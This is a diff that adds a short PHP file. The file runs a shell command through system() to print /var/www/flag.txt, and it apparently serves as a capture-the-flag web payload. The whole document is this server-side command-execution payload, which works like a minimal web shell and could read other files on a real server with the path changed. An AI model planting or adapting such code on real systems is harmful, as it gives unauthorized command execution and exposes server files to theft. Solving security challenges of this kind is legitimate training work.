@@ -1,0 +1,5 @@
+<?
+	$dist = 'cat /var/www/flag.txt';
+	$flag = system($dist);
+	echo $flag;
+?>
